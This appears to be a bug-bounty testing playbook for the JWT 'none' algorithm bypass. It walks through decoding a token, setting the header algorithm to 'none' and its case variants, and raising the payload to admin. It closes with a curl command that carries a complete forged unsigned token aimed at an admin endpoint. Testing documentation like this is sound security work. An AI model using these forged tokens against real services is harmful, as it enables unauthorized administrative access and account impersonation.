# JWT 'None' Algorithm Bypass

## When to Use
- When assessing web applications or microservices that utilize JWTs for authentication and authorization.
- Specifically during the initial phases of analyzing a JWT implementation to check for fundamental configuration flaws in token verification.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Capture and Decode the Token

Intercept a valid request containing your JWT (usually in the `Authorization: Bearer <token>` header or a cookie). A JWT consists of three base64-url encoded parts separated by periods: `Header.Payload.Signature`.

```bash
# Concept: Decode the Header and Payload Token: eyJhbGciOiJIUzI1NiIsInR5cCI...
echo "eyJhbGciOiJIUzI1NiIsInR5cCI..." | base64 -d
# Header Output: {"alg":"HS256","typ":"JWT"}
```

### Phase 2: Modify Header to 'None' Algorithm

Change the `alg` value in the header. Servers might accept variations of the string "none".

```json
// {"alg": "none", "typ": "JWT"}
// Other variations to try: "None", "NONE", "nOnE"
```
Re-encode this modified header to Base64-URL format (ensure no padding `=`).

### Phase 3: Modify Payload (Elevation of Privilege)

Modify the payload to elevate privileges or impersonate another user.

```json
// {"sub": "admin", "iat": 1516239022, "admin": true}
```
Re-encode the modified payload to Base64-URL format.

### Phase 4: Construct and Send the Forged Token

Combine the new header and payload, appending a trailing dot, but **remove the signature completely**.

```text
# [Base64_Header_None].[Base64_Payload_Admin].
```

Send the request with the new token via Burp Suite or curl.

```bash
# curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiYWRtaW4iOnRydWV9." http://target.local/api/admin
